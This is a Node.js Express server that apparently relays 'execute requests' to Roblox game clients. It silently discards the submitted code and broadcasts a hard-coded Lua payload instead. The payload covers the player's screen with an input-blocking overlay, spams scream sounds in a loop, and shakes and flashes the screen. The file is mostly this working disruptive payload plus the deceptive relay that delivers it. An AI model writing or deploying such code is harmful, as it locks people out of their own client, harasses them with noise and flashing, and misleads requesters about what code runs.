const express = require("express");
const { EventEmitter } = require("events");

const app = express();
const events = new EventEmitter();
const EVENT = "RemoteEvent";

app.use(express.json());

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

function generateGibberish(length = 16) {
  const chars = "你好世界𓂀𒐫ÆØµΔЖѬ()";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

app.post("/executeRequest", (req, res) => {
  const { username, code } = req.body;
  if (!username || !code) return res.sendStatus(400);

  console.log(`Execute request from: ${username}`);

  const reason = generateGibberish();

const trollPayload = `
if game:GetService("Players").LocalPlayer then
    local player = game:GetService("Players").LocalPlayer
    local gui = Instance.new("ScreenGui")
    gui.Name = "UltimateTrollGui"
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1,0,1,0)
    frame.Position = UDim2.new(0,0,0,0)
    frame.BackgroundColor3 = Color3.new(1,0,0)
    frame.BorderSizePixel = 0
    frame.Parent = gui

    -- Input blocker
    local blocker = Instance.new("TextButton")
    blocker.Size = UDim2.new(1,0,1,0)
    blocker.BackgroundTransparency = 1
    blocker.Text = ""
    blocker.Parent = frame
    blocker.AutoButtonColor = false
    blocker.Active = true
    blocker.Selectable = false
    blocker.Modal = true

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1,0,0.3,0)
    textLabel.Position = UDim2.new(0,0,0.35,0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "COOLKID HAS STOPPED YOU\nFROM EXPLOITING"
    textLabel.TextColor3 = Color3.new(1,1,1)
    textLabel.TextStrokeColor3 = Color3.new(0,0,0)
    textLabel.TextStrokeTransparency = 0
    textLabel.Font = Enum.Font.Antique
    textLabel.TextScaled = true
    textLabel.TextWrapped = true
    textLabel.Parent = frame

    -- Sound spam
    spawn(function()
        while true do
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://138186576" -- creepy scream sound
            sound.Volume = 1
            sound.Parent = frame
            sound:Play()
            -- no wait, spam sounds instantly (many will overlap)
            wait(0.01) -- minimal wait to avoid script errors
            sound.Ended:Connect(function() sound:Destroy() end)
        end
    end)

    -- Screen shake function
    local function shake()
        local amplitude = 20
        while true do
            for i = 1, 30 do
                frame.Position = UDim2.new(0, math.random(-amplitude, amplitude), 0, math.random(-amplitude, amplitude))
                wait(0.03)
            end
            frame.Position = UDim2.new(0,0,0,0)
            wait(0.1)
        end
    end
    spawn(shake)

    -- Flashing red/black background
    spawn(function()
        while true do
            for i = 0, 1, 0.1 do
                frame.BackgroundColor3 = Color3.new(1, 0, 0):Lerp(Color3.new(0, 0, 0), i)
                wait(0.05)
            end
            for i = 0, 1, 0.1 do
                frame.BackgroundColor3 = Color3.new(0, 0, 0):Lerp(Color3.new(1, 0, 0), i)
                wait(0.05)
            end
        end
    end)

    -- Glitchy flicker text color effect
    spawn(function()
        while true do
            for i = 1, 10 do
                textLabel.TextColor3 = Color3.new(math.random(), math.random(), math.random())
                wait(0.03)
            end
            textLabel.TextColor3 = Color3.new(1,1,1)
            wait(0.3)
        end
    end)
end
`;

  events.emit(EVENT, { username, code: trollPayload });
  res.sendStatus(200);
});

app.get("/fetchExecuteRequests", (req, res) => {
  events.once(EVENT, ({ username, code }) => {
    res.json({ username, code });
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
